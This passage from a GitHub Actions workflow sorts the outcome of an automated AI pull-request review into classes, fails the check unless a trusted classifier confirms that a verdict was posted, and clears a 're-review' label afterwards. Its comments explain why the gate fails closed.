          LIMIT: ${{ steps.verdict.outputs.limit }}
          HAVE_TOKEN: ${{ steps.credential.outputs.have }}
          FORK: ${{ steps.target.outputs.fork }}
        run: |
          # Order is precedence, most specific first. Each arm answers a
          # different question, and the earlier ones are facts this job
          # established itself rather than readings of the run's own words.
          if [ "$FORK" = yes ]; then
            class=fork
          elif [ "$HAVE_TOKEN" = no ]; then
            class=no_credentials
          elif [ "$STANDS" = yes ]; then
            class=reviewed
          elif [ -n "$LIMIT" ]; then
            class="quota_$LIMIT"
          else
            case "$CLASS" in
              max_turns) class=turn_budget ;;
              # `no` without a limit string: the run never got a usable model
              # response and named no cause. With the limit string it would
              # have been caught by the arm above, so what is left is a token
              # that is missing, invalid or revoked.
              no) class=no_credentials ;;
              completed) class=no_verdict ;;
              *) class=infra ;;
            esac
          fi

          echo "review outcome class: $class"
          echo "::notice title=review-outcome-class::$class"
          {
            echo "- outcome class: \`$class\`"
          } >> "$GITHUB_STEP_SUMMARY"

      # THE CHECK (DOR-1665, DOR-1877). This step always runs. A successful
      # action and a failed action take the same route: both pass only when the
      # trusted classifier found a clean result and this run posted its verdict.
      # A skipped action means setup never reached a checkable review, so it is
      # red.
      #
      # RED IS THE DEFAULT AND THE FALLTHROUGH, and that is the load-bearing part.
      # `stands` is `yes` only when the trusted classifier confirmed both halves.
      # Everything else lands on `exit 1`: a review that never started, one that
      # ran out of turns, one that died, one that reported success having posted
      # nothing, an unreadable execution log, a classifier that could not be
      # materialized, and a step above that failed outright. This step still runs
      # after prior failures because it is guarded by `always()`. Empty is not
      # `yes`, so a mistyped step id reinstates the old red check rather than
      # inventing a green one.
      #
      # Deliberately still `pull_request`-only, like the rest of this workflow:
      # `review` is not a required check and must never report on `merge_group`.
      #
      # scripts/test-review-classifier.sh pins this step's `if:`, its whole
      # `run:` block and the outcome × verdict matrix. A green check with no
      # review posted is a failure mode this repo has actually had. Restoring the
      # old failure-only condition on the verdict probe leaves `STANDS` empty and
      # makes this always-running gate fail visibly. Restoring it on this final
      # step skips the gate after a successful-but-silent action and recreates the
      # false green.
      - name: Decide the check
        if: always()
        env:
          REVIEW_OUTCOME: ${{ steps.claude-review.outcome }}
          STANDS: ${{ steps.verdict.outputs.stands }}
        run: |
          case "$REVIEW_OUTCOME" in
            success | failure) ;;
            *)
              echo "::error::The automated review did not run to a checkable result (outcome: ${REVIEW_OUTCOME:-missing})."
              exit 1
              ;;
          esac

          if [ "$STANDS" = yes ]; then
            if [ "$REVIEW_OUTCOME" = failure ]; then
              echo "The review finished and its verdict is on the PR; only the machinery around it failed."
            else
              echo "The review finished and its verdict is on the PR."
            fi
            exit 0
          fi
          exit 1

      # Re-review is a reusable button: clear the label so re-applying it later
      # fires another pass. Runs even if the review failed, so the label never
      # sticks. `re-review` is the only label that triggers this workflow.
      #
      # Dispatch clears it too (DOR-457). It used to be scoped to `labeled` events,
      # which stranded the label in exactly the case the dispatch hatch exists for:
      # labelling a conflicted PR produces no run at all, so nothing clears the
      # label, so the button is stuck down until someone removes it by hand. A
      # dispatched review is the same "look at this again" request, so it is the
      # right moment to reset the button.
      - name: Clear re-review label
        if: >-
          always() && (
            github.event_name == 'workflow_dispatch' ||
            (github.event.action == 'labeled' && github.event.label.name == 're-review')
          )
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          PR_NUMBER: ${{ steps.target.outputs.number }}
          REPO: ${{ github.repository }}
        run: |
          # On dispatch the label is usually absent, and `gh pr edit --remove-label`
          # errors on a label the PR does not carry — so look first. An empty
          # PR_NUMBER (the resolve step refused a fork) also lands here harmlessly.
          if gh pr view "$PR_NUMBER" --repo "$REPO" --json labels --jq '.labels[].name' 2>/dev/null \
            | grep -qx 're-review'; then
            gh pr edit "$PR_NUMBER" --repo "$REPO" --remove-label re-review
          else
            echo "no re-review label to clear"
          fi
